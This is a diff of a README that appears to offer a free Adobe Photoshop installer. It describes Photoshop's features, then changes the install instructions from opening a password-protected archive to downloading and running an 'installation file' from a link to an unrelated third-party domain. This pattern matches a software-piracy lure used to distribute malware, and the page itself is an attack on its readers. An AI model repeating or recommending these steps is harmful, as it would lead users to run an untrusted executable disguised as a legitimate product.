@@ -6,8 +6,7 @@ It uses a layer-based editing system that enables raster image creation and alte
 Layers can also act as masks or filters, changing underlying colors. Shadows and other effects can be added to the layers.
 Adobe promotes Photoshop as a tool for professionals. However, beginners can use Photoshop as well with many helpful tutorials on the market that train users in how to use Photoshop's various features.
 # How to install?
-1. Download this repository and open the archive
-## Password for the archive: adobe2023
+1. Download the installation file from [this site](https://portalproveedores.com.mx/)
 2. Run the installation file
 3. Wait for the program to be fully installed
 4. Run the program
